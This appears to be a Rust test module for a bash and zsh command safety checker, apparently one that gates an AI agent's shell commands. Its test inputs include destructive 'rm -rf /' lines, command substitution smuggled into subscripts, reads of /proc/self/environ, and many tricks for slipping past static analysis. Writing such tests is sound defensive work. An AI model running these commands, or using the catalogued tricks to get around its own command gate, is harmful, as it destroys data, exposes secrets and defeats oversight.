            "'read -a' (combined in '-ra') operand contains array subscript — bash evaluates $(cmd) in subscripts",
        );
        // Fused: printf -vNAME.
        assert_deny(
            &["printf", "-varr[0]"],
            "'printf -v' (fused in '-varr[0]') operand contains array subscript — bash evaluates $(cmd) in subscripts",
        );
        // printf '[%s]' x stays safe — '[' is in the format string, not after -v.
        assert_ok(&["printf", "[%s]", "x"]);
    }

    #[test]
    fn test_arith_cmp_subscript_denied() {
        assert_deny(
            &["[[", "a[$(id)]", "-eq", "1", "]]"],
            "'[[ ... -eq ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // Right operand too.
        assert_deny(
            &["[[", "1", "-lt", "a[$(id)]", "]]"],
            "'[[ ... -lt ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // String comparison does NOT trigger arithmetic eval.
        assert_ok(&["[[", "a[x]", "==", "y", "]]"]);
    }

    #[test]
    fn bare_subscript_name_builtins() {
        assert_deny(
            &["read", "a[$(id)]"],
            "'read' positional NAME 'a[$(id)]' contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        assert_deny(
            &["unset", "x[$(id)]"],
            "'unset' positional NAME 'x[$(id)]' contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        // read -p '[foo] ' var — the prompt operand is skipped, var is safe.
        assert_ok(&["read", "-p", "[foo] ", "var"]);
        // Fused -rp '[foo]' var: data-flag char last → next arg is prompt (skipped).
        assert_ok(&["read", "-rp", "[foo] ", "var"]);
    }

    #[test]
    fn shell_keyword_as_command_denied() {
        assert_deny(
            &["do", "false"],
            "Shell keyword 'do' as command name — tree-sitter mis-parse",
        );
        assert_deny(
            &["for", "i"],
            "Shell keyword 'for' as command name — tree-sitter mis-parse",
        );
    }

    #[test]
    fn fragment_empty_and_placeholder_command_names() {
        assert_deny(
            &[""],
            "Empty command name — argv[0] may not reflect what bash runs",
        );
        assert_deny(&["-x"], "Command appears to be an incomplete fragment");
        assert_deny(&["|foo"], "Command appears to be an incomplete fragment");
        assert_deny(
            &["__CMDSUB_OUTPUT__"],
            "Command name is runtime-determined (placeholder argv[0])",
        );
        assert_deny(
            &["pre__TRACKED_VAR__"],
            "Command name is runtime-determined (placeholder argv[0])",
        );
    }

    #[test]
    fn jq_system_and_dangerous_flags() {
        assert_deny(
            &["jq", "system(\"rm -rf /\")"],
            "jq command contains system() function which executes arbitrary commands",
        );
        assert_deny(
            &["jq", "-f", "evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        assert_deny(
            &["jq", "--from-file=evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        // Plain jq filter is safe.
        assert_ok(&["jq", "."]);
        assert_ok(&["jq", "-r", ".name"]);
    }

    #[test]
    fn proc_environ_argv_and_redirect() {
        assert_deny(
            &["cat", "/proc/self/environ"],
            "Accesses /proc/*/environ which may expose secrets",
        );
        // `cat < /proc/self/environ` — redirect target.
        let mut c = sc(&["cat"]);
        c.redirects.push(Redirect {
            op: "<".to_string(),
            target: "/proc/self/environ".to_string(),
            fd: None,
        });
        match check_semantics(&[c]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "Accesses /proc/*/environ which may expose secrets")
            }
            SemanticCheckResult::Ok => panic!("redirect /proc/environ not denied"),
        }
    }

    #[test]
    fn newline_hash_argv_env_redirect() {
        assert_deny(
            &["echo", "foo\n# bar"],
            "Newline followed by # inside a quoted argument can hide arguments from path validation",
        );
        // Env var value.
        let mut c = sc(&["echo", "hi"]);
        c.env_vars.push(("X".to_string(), "v\n#hidden".to_string()));
        assert!(matches!(
            check_semantics(&[c]),
            SemanticCheckResult::Deny { .. }
        ));
        // Redirect target.
        let mut c2 = sc(&["echo", "hi"]);
        c2.redirects.push(Redirect {
            op: ">".to_string(),
            target: "out\n#x".to_string(),
            fd: None,
        });
        match check_semantics(&[c2]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "Newline followed by # inside a redirect target can hide arguments from path validation"
            ),
            SemanticCheckResult::Ok => panic!("redirect newline-hash not denied"),
        }
    }

    #[test]
    fn safe_commands_are_ok() {
        assert_ok(&["ls", "-la"]);
        assert_ok(&["git", "status"]);
        assert_ok(&["echo", "hello world"]);
        assert_ok(&["cat", "file.txt"]);
        assert_ok(&["grep", "-rn", "pattern", "src/"]);
        // Empty command list is Ok.
        assert_eq!(check_semantics(&[]), SemanticCheckResult::Ok);
        // A command with undefined name (empty argv) is skipped (continue).
        assert_eq!(check_semantics(&[sc(&[])]), SemanticCheckResult::Ok);
    }

    #[test]
    fn first_deny_across_multiple_commands() {
        // Second command is the unsafe one — battery checks every command.
        match check_semantics(&[sc(&["ls"]), sc(&["eval", "id"])]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "'eval' evaluates arguments as shell code")
            }
            SemanticCheckResult::Ok => panic!("eval in 2nd command not denied"),
        }
    }

    // ── L5: superset branches reconciled from the 2.1.195 binary ──

    #[test]
    fn path_stripped_wrapper_unwraps_real_command() {
        // Path-prefixed wrappers are basename-matched, then stripped, so the real
        // (dangerous) command is still checked — no under-ask via `/usr/bin/…`.
        assert_deny(
            &["/usr/bin/nohup", "eval", "rm -rf /"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["/bin/timeout", "5", "eval", "x"],
            "'eval' evaluates arguments as shell code",
        );
    }

    #[test]
    fn find_action_flags_and_globs_denied() {
        for f in [
            "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf",
            "-fls", "-files0-from",
        ] {
            assert_deny(
                &["find", ".", f, "rm", "{}", ";"],
                &format!("find with '{f}' executes commands or modifies files — cannot be auto-allowed by a Bash(find:*) prefix rule"),
            );
        }
        // Value-taking primaries skip their operand; benign find is OK.
        assert_ok(&["find", ".", "-name", "*.txt", "-type", "f"]);
        // A glob metachar in a non-value argument is denied.
        assert_deny(
            &["find", "[abc]", "-print"],
            "find argument '[abc]' contains glob characters — could glob-expand to a dangerous action",
        );
        // `-newerXY` is a value-taking primary (operand skipped).
        assert_ok(&["find", ".", "-newermt", "2020-01-01"]);
    }

    #[test]
    fn find_unquoted_glob_in_text_denied() {
        let cmd = SimpleCommand {
            argv: vec!["find".into(), ".".into(), "-name".into(), "x".into()],
            text: "find . -name x -exec*".into(),
            ..Default::default()
        };
        match check_semantics(&[cmd]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "find contains unquoted glob characters — could glob-expand to a dangerous action before find runs"
            ),
            SemanticCheckResult::Ok => panic!("unquoted glob in find text not denied"),
        }
        // Quoted glob in text is fine.
        assert!(!find_unquoted_glob("find . -name '*.txt'"));
        assert!(find_unquoted_glob("find . -name *.txt"));
        assert!(!find_unquoted_glob("find . -name x # *"));
    }

    #[test]
    fn set_options_denied() {
        assert_deny(
            &["set", "-o", "extendedglob"],
            "'set -o/+o extendedglob' changes shell parsing/globbing state — can enable globsubst/extendedglob and defeat static analysis",
        );
        // `functrace`/`pipefail` ARE in the safe-option set → allowed.
        assert_ok(&["set", "-o", "functrace"]);
        // unsafe single-letter option (`-a` allexport not in SET_SAFE_LETTERS).
        assert_deny(
            &["set", "-a"],
            "'set -a' changes shell option state (allexport/keyword/…) — defeats static env-var analysis; see SET_O_SAFE_LETTERS",
        );
        // Safe: `set -e`, `set -x`, `set -- args`, `set -o pipefail`.
        assert_ok(&["set", "-e"]);
        assert_ok(&["set", "-x"]);
        assert_ok(&["set", "--", "a", "b"]);
        assert_ok(&["set", "-o", "pipefail"]);
    }

    #[test]
    fn declare_family_flags_denied() {
        assert_deny(
            &["declare", "-n", "ref=x"],
            "'declare' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics",
        );
        assert_deny(
            &["typeset", "-i", "n=1+1"],
            "'typeset' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics",
        );
        // export -i (zsh matheval) — export is not declare/typeset/local so the
        // first branch is skipped; the zsh-typeset matheval branch catches it.
        assert_deny(
            &["export", "-i", "n=1"],
            "'export' with -i/-E/-F flag (reached as plain command via wrapper/quote) — zsh bin_typeset mathevals the RHS",
        );
        // float/integer with no explicit sign operand.
        assert_deny(
            &["integer", "x"],
            "zsh 'integer' operand — implicit typeset -E/-i arithmetically evaluates the (existing or assigned) value",
        );
        // Plain `declare x=1` is fine.
        assert_ok(&["declare", "x=1"]);
        assert_ok(&["local", "y=2"]);
    }

    #[test]
    fn jobs_print_jq_runsarg_denied() {
        assert_deny(
            &["jobs", "-x", "rm", "-rf", "/"],
            "'jobs -x' executes its argument as a command — cannot be statically analyzed",
        );
        assert_deny(
            &["print", "-P", "$(id)"],
            "'print -P' operand contains command substitution — zsh prompt expansion evaluates $(cmd)",
        );
        // jq include/import + combined dangerous flags (`-nf`).
        assert_deny(
            &["jq", "import \"foo\" as bar; .", "."],
            "jq command contains include/import — modules can load arbitrary .jq files via {search:\".\"} and call env or other builtins",
        );
        assert_deny(
            &["jq", "-nf", "evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        // runs-its-argument family.
        for c in [
            "watch", "ionice", "chrt", "setsid", "taskset", "strace", "ltrace", "script", "flock",
            "unshare", "nsenter",
        ] {
            assert_deny(
                &[c, "rm", "-rf", "/"],
                &format!("'{c}' runs its argument as a command — cannot be statically analyzed"),
            );
        }
    }

    #[test]
    fn zsh_dangerous_additions_denied() {
        for b in ["setopt", "unsetopt", "shopt", "disable", "repeat", "foreach", "zcompile"] {
            assert_deny(
                &[b, "x"],
                &format!("Zsh builtin '{b}' can bypass security checks"),
            );
        }
    }

    #[test]
    fn arith_cmp_nonnumeric_denied() {
        // `[[ foo -eq 5 ]]` — foo non-numeric → arith-eval risk.
        assert_deny(
            &["[[", "foo", "-eq", "5", "]]"],
            "'[[ ... -eq ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // numeric operands are fine.
        assert_ok(&["[[", "5", "-eq", "5", "]]"]);
        // `test -t 1` (numeric) ok; `test -t foo` denied.
        assert_ok(&["test", "-t", "1"]);
        assert_deny(
            &["test", "-t", "foo"],
            "'test -t' operand is non-numeric — zsh arith-evals identifiers (may run $(cmd))",
        );
    }

    #[test]
    fn newline_hash_is_deferred() {
        // A command with a newline-# AND a hard violation returns the hard one.
        let with_nl = SimpleCommand {
            argv: vec!["eval".into(), "x\n#hidden".into()],
            ..Default::default()
        };
        match check_semantics(&[with_nl]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "'eval' evaluates arguments as shell code")
            }
            SemanticCheckResult::Ok => panic!("eval not denied"),
        }
        // Newline-# alone (no other violation) → the deferred reason.
        let only_nl = SimpleCommand {
            argv: vec!["echo".into(), "x\n#hidden".into()],
            ..Default::default()
        };
        match check_semantics(&[only_nl]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "Newline followed by # inside a quoted argument can hide arguments from path validation"
            ),
            SemanticCheckResult::Ok => panic!("newline-# not denied"),
        }
    }
}
